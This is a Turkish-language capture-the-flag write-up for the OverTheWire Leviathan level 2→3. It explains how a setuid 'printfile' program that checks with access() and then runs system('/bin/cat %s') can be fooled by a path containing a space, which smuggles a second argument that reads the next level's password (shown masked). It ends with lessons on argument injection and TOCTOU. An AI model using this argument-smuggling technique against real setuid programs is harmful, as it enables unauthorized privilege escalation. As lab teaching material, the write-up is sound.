# Leviathan 2 → 3

> **Bağlantı:** `ssh leviathan2@leviathan.labs.overthewire.org -p 2223`
> **Hedef:** setuid `printfile` programındaki `access()` + `system()` zafiyetini kullanarak `leviathan3` parolasını oku.

---

## 1. Keşif (Recon)

```bash
leviathan2@gibson:~$ ls -la
-r-sr-x---  1 leviathan3 leviathan2 15076 printfile

leviathan2@gibson:~$ ./printfile
*** File Printer ***
Usage: ./printfile filename

leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```

Program bir dosya adı alıp içeriğini basıyor, ama parola dosyasını doğrudan vermemize izin vermiyor ("You cant have that file..."). Demek ki önce bir **erişim kontrolü** var.

## 2. Analiz — `ltrace`

Okuyabildiğimiz bir test dosyasıyla izleyelim:

```bash
leviathan2@gibson:~$ echo hello > /tmp/t.txt
leviathan2@gibson:~$ ltrace ./printfile /tmp/t.txt
access("/tmp/t.txt", 4)                                   = 0
snprintf("/bin/cat /tmp/t.txt", 511, "/bin/cat %s", "/tmp/t.txt") = ...
geteuid()                                                 = ...
setreuid(...)                                             = 0
system("/bin/cat /tmp/t.txt")                             # hello
```

Program mantığı:
1. `access(argv[1], R_OK)` → dosyayı **gerçek uid (leviathan2)** ile okuyabiliyor muyuz diye kontrol eder. Parola dosyasını veremememizin sebebi bu (leviathan2 onu okuyamaz → "You cant have that file...").
2. `snprintf(buf, "/bin/cat %s", argv[1])` → komut string'i kurar.
3. `system(buf)` → komutu **leviathan3** yetkisiyle çalıştırır.

## 3. Zafiyet

İki ayrı katman aynı string'i farklı yorumluyor:

- **`access()`** argv[1]'i **tek bir bütün yol** olarak görür.
- **`system()` → `/bin/sh -c`** ise string'i **boşluklardan bölüp** `cat`'e *birden çok argüman* verir.

> Saf symlink hilesi burada işe yaramaz: `access()` symlink'i takip edip **gerçek uid** ile hedefin izinlerine bakar; leviathan2 parola dosyasını okuyamadığı için `access()` başarısız olur.

Hile: argv[1]'i, içinde **boşluk olan ama gerçekten var olan ve okunabilir** bir yol yapacağız. Böylece:
- `access()` → bizim oluşturduğumuz dosyayı görür, **geçer**;
- `cat` → boşluktan bölünen ikinci parçayı (parola dosyasını) **leviathan3 olarak** okur.

Bunu, boşluk içeren bir dizin yapısı kurarak sağlıyoruz.

## 4. Sömürü (Exploit)

```bash
D=/tmp/l2_$$
# "a " (sonu boşluklu) dizini altında etc/leviathan_pass/leviathan3 yolunu OLUŞTUR:
mkdir -p "$D/a /etc/leviathan_pass"
echo dummy > "$D/a /etc/leviathan_pass/leviathan3"

# argv[1] = "$D/a /etc/leviathan_pass/leviathan3"  (içinde boşluk var)
~/printfile "$D/a /etc/leviathan_pass/leviathan3"
```

Ne oluyor:

| Katman | Gördüğü |
|--------|---------|
| `access("$D/a /etc/leviathan_pass/leviathan3")` | Bizim kurduğumuz dosya → **var, okunabilir → geçer** |
| `system("/bin/cat $D/a /etc/leviathan_pass/leviathan3")` | `sh` boşluktan böler → `cat` iki argüman alır: |
| arg 1: `$D/a` | yok → `cat: ... No such file or directory` |
| arg 2: `/etc/leviathan_pass/leviathan3` | **leviathan3 olarak gerçek parolayı basar** ✓ |

Çıktı:

```
/bin/cat: /tmp/l2_3/a: No such file or directory
**********
```

## 5. Çözüm Özeti

→ `leviathan3` parolası: `**********`

| Adım | Bulgu |
|------|-------|
| Recon | setuid `printfile`, parola dosyasını reddediyor |
| ltrace | `access()` → `snprintf("/bin/cat %s")` → `system()` |
| Zafiyet | `access` bütün yolu, `sh` boşlukla böler (argüman enjeksiyonu) |
| Exploit | Boşluklu dizin → access geçer, cat parolayı leviathan3 olarak okur |

**Alınan ders:** Kullanıcı girdisini bir kabuk komutuna (`system`/`popen`) gömmek **komut/argüman enjeksiyonu** açar. Ayrıca `access()` ile sonraki işlemi farklı yorumlamak hem TOCTOU hem de bu boşluk-bölme sınıfı hatalara yol açar. Doğrusu: `system` yerine `execv` ile dosya adını tek argüman olarak vermek ve `access()` ile gerçek işlemi aynı tutmaktır.
